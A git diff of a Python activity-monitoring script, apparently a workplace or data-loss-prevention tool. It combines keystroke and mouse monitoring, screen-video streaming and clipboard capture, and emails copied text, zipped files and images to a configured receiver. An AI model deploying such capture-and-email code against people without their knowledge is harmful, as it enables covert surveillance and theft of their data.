@@ -2,6 +2,7 @@
 import sys
 import io
 import time
+import signal
 import socket
 import os
 import zipfile
@@ -9,9 +10,10 @@ from helpers.videoClient import SendVideo as Video
 from helpers.emailClient import EmailClient as Email
 from helpers.keyMouseActivity import KeyMouseMonitor as KeyMouse
 from helpers.clipboardActivity import ClipboardMonitor as Clipboard
+from helpers.activityLogger import ActivityLogger as Logger
 
 
-class ActivityMonitor(Video, Email, KeyMouse, Clipboard):
+class ActivityMonitor(KeyMouse, Video, Email, Clipboard):
     """
     A script that continously monitors the user's activity by capturing video 
     of the screen and logs all the processes of the user activities.
@@ -32,13 +34,16 @@ class ActivityMonitor(Video, Email, KeyMouse, Clipboard):
 
     _LOG_INTERVAL = 10
 
-    def __init__(self, ):
+    def __init__(self, ip , port, password, sender, receiver):
+
+
+        KeyMouse.__init__(self)
+        Video.__init__(self, ip, port)
+        Email.__init__(self, password, sender, receiver)
+        Clipboard.__init__(self, on_text=self._on_text, on_image=self._on_image, on_file=self._on_file)
+       
 
         self.user = socket.gethostbyname(socket.gethostname())
-
-        #: start the clipboard monitoring on a separate thread
-        #self.clipMonitor = ClipboardMonitor(on_text = self.on_text, on_file=self.on_file, on_image=self.on_image)
-        #self.clipMonitor.start()
 
         self._copied_content_size = int()
         self._copied_content = str()
@@ -50,8 +55,7 @@ class ActivityMonitor(Video, Email, KeyMouse, Clipboard):
         self._24_hrs_content_size = None
         
     
-
-    def on_text(self, text:str):
+    def _on_text(self, text:str):
         """
         is triggered when text is copied to clipboard
         """
@@ -77,7 +81,7 @@ class ActivityMonitor(Video, Email, KeyMouse, Clipboard):
 
         return file_size, zip
         
-    def on_file(self, files:io.FileIO):
+    def _on_file(self, files:io.FileIO):
         """
         is triggered when files are copied to clipboard
         """
@@ -108,11 +112,10 @@ class ActivityMonitor(Video, Email, KeyMouse, Clipboard):
         # ZipFile.close()
 
         file_size, zipped_files = self.getSize_ZippedFiles(files)
-        print("file, zip", file_size, zipped_files)
 
         self.checkFileSize(file_size, zipped_files, "file")
 
-    def on_image(self, image):
+    def _on_image(self, image):
         """
         is triggered when files are copied to clipboard
         """
@@ -131,17 +134,14 @@ class ActivityMonitor(Video, Email, KeyMouse, Clipboard):
         """
         print(f"file size: {file_size}\ncontent: {file}\n type: {type}")
       
-        print(dir(self.emailClient))
-       
-
         if file_size >= 50:
             if type == "text":
-                #: omits attachment for test files
-                self.emailClient.sent_email(self.user, file_size, file)
+                #: omits attachment for test file
+                self.send_email(self.user,file_size, file )
                 pass
             else:
                 #: send files as attachment if not text (i.e for bytes and images)
-                self.emailClient.send_email(self.user, file_size, "see attached zipped file(s)", file)
+                self.send_email(self.user, file_size, "see attached zipped file(s)", file)
                 pass
         else:
             self._copied_content_size += file_size
@@ -184,45 +184,32 @@ class ActivityMonitor(Video, Email, KeyMouse, Clipboard):
         Disables the clipboard for 24 hours
         """
         pass
-    
-    def estimateIdleTime(self, keyboard_stroke_count, mouse_count):
+
+    def handle_time_elapsed_signal(self, signum, frame):
+        """
+        a signal handler function that is called when the 24 hours in which the clipboard is 
+        disabled is up
+        """
+        if self.hasDefaulted:
+            self.hasDefaulted = False
+        else:
+            self.hasDefaulted = True
+
+    def estimateTime(self):
         """
         Estimates the number of time the user is idle
         """
-        pass
-
-    
         
-
-
 if __name__=="__main__":
-
-    # from activityLogger import ActivityLogger
-    # from emailClient import EmailClient 
-   
-    # password = os.environ["PASSWORD"]
-    # sender = os.environ["SENDER"]
-    # receiver = os.environ["RECEIVER"]
-    # path = Path.joinpath(Path.cwd(), "autotest", "data", "activityLog.txt")
-
-    # emailClient = EmailClient(password, sender, receiver)
-    # video_recorder = VideoCapture()
-    # activityLogger = ActivityLogger(path)
+    ip = "127.0.0.1"
+    port = 5005
+    password = os.environ["PASSWORD"]
+    sender = os.environ["SENDER"]
+    receiver = os.environ["RECEIVER"]
+    monitor = ActivityMonitor(ip, port, password, sender, receiver)  
     
-    # emailClient.start()
-    # video_recorder.start()
-    # activityLogger.start
     
-
-    #monitor = ActivityMonitor(video_recorder, activityLogger, emailClient)  
-
-    # k = Thread(target=monitor.keyMonitor)
-    # m = Thread(target=monitor.mouseMonitor)
     
-    # k.start()
-    # m.start()
-    
-    pass
 
     
     
